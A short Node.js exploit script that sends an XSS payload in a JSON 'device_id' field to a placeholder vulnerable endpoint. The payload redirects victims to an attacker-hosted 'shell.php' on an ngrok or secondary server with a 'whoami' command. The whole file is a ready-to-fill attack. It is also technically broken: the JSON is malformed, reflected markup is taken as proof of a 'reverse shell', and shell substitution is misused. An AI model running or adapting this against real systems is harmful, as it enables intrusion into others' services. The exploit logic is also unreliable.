const http = require('http');

// Craft the reverse shell payload
const payload = `{"device_id":"<img src=x onerror="window.location='[NGROK OR SECONDARY SERVER WHERE PAYLOAD IS HOSTED]shell.php?cmd=$(whoami)'">`;

// Create an HTTP request to the vulnerable endpoint
const options = {
  hostname: '[VULNERABLE HOSTNAME]',
  path: '[VULNERABLE ENDPOINT]',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': payload.length
  }
};

// Send the HTTP request with the malicious payload
const req = http.request(options, (res) => {
  let data = '';
  res.on('data', (chunk) => {
    data += chunk;
  });
  res.on('end', () => {
    // Check if the reverse shell was executed
    if (data.includes('<img src=x onerror="window.location=')) {
      console.log('Reverse shell exploit successful!');
    } else {
      console.log('Reverse shell exploit failed.');
    }
  });
});

req.on('error', (error) => {
  console.error(error);
});

req.write(payload);
req.end();
